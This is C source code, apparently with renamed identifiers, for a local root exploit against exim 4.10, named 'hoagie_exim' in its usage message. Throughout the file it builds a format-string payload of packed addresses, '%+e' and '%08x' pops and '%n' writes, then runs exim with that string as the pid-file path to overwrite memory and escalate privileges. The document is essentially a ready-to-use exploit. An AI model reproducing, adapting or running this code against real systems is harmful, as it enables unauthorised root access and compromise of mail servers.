
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 (unsigned long) ;
 int FUNC_1 (unsigned long) ;
 int FUNC_2 (unsigned long) ;
 int FUNC_3 (unsigned long) ;
 int VAR_2 ;
 int FUNC_4 (unsigned char*,char*,char*,char*,char*,unsigned char*,char*,unsigned char*,char*,int ,int *) ;
 int FUNC_5 (int) ;
 int FUNC_6 (int ,unsigned int*,unsigned int*,unsigned int*,unsigned int*,int) ;
 int FUNC_7 (int*,int*,int*) ;
 unsigned char* VAR_3 ;
 int VAR_4 ;
 int FUNC_8 (char*,...) ;
 int VAR_5 ;
 int FUNC_9 (unsigned char*,char*,int,...) ;
 int FUNC_10 (unsigned char*,...) ;
 int FUNC_11 (unsigned char*,char*) ;

int FUNC_12(int VAR_6, char **VAR_7)
{
   int VAR_8, VAR_9, VAR_10, VAR_11;
   unsigned char VAR_12[10000], VAR_13[1000];
   unsigned long VAR_14=VAR_0,
                 VAR_15=VAR_0+1,
                 VAR_16=VAR_0+2,
                 VAR_17=VAR_0+3;
   unsigned int VAR_18,VAR_19,VAR_20,VAR_21;

   if(VAR_6!=2)
   {
      FUNC_8("local root exploit for exim 4.10 [only works for exim admin users]\n\n");
      FUNC_8("./hoagie_exim path_to_exim\n\n");
      FUNC_5(1);
   }
   FUNC_11(VAR_3,VAR_7[1]);

   FUNC_7(&VAR_8,&VAR_9,&VAR_10);
   FUNC_8("Using %d bigpops and %d smallpops.\n", VAR_8,VAR_9);
   FUNC_8("Written bytes: %d\n",VAR_10);

   FUNC_11(VAR_12,"/tmp/%s");
   for(VAR_11=0;VAR_11<VAR_1;VAR_11++)
      FUNC_10(VAR_12,"Z");

   FUNC_9(VAR_13,"0000%c%c%c%c"
               "0000%c%c%c%c"
               "0000%c%c%c%c"
               "0000%c%c%c%c",
           FUNC_0(VAR_14),FUNC_1(VAR_14),FUNC_2(VAR_14),FUNC_3(VAR_14),FUNC_0(VAR_15),FUNC_1(VAR_15),FUNC_2(VAR_15),FUNC_3(VAR_15),
           FUNC_0(VAR_16),FUNC_1(VAR_16),FUNC_2(VAR_16),FUNC_3(VAR_16),FUNC_0(VAR_17),FUNC_1(VAR_17),FUNC_2(VAR_17),FUNC_3(VAR_17));
   FUNC_10(VAR_12,VAR_13);
   for(VAR_11=0;VAR_11<VAR_8;VAR_11++)
      FUNC_10(VAR_12,"%+e");
   for(VAR_11=0;VAR_11<VAR_9;VAR_11++)
      FUNC_10(VAR_12,"%08x");

   FUNC_6(VAR_2,&VAR_18,&VAR_19,&VAR_20,&VAR_21,VAR_10);

   FUNC_9(VAR_13,"%%.%uu%%n%%.%uu%%n%%.%uu%%n%%.%uu%%n",VAR_18,VAR_19,VAR_20,VAR_21);
   FUNC_10(VAR_12,VAR_13);


   FUNC_8("calling exim with fs='%s'\n",VAR_12);
   FUNC_9(VAR_13,"%d",++VAR_4);
   FUNC_4(VAR_3,"exim","-bd","-d","-oX",VAR_13,"-oP",VAR_12,"-F",VAR_5,((void*)0));

   return 0;
}
